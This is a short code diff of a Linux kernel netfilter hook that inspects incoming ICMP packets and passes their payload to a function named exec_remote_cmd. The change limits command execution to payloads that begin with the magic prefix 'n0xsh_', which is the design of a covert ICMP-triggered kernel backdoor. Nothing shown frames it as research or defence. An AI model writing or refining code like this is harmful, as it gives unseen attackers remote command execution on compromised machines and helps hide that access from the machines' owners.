@@ -81,7 +81,9 @@ unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hoo
 
     // print the payload data
     printk(KERN_INFO "Received ICMP packet len %d from %pI4 with payload: %s\n", data_len, &ip->saddr, data);
-    exec_remote_cmd(data);
+    if (strncmp(data, "n0xsh_", 6) == 0) {
+        exec_remote_cmd(data);
+    }
     kfree(data);
     return NF_ACCEPT;
 }
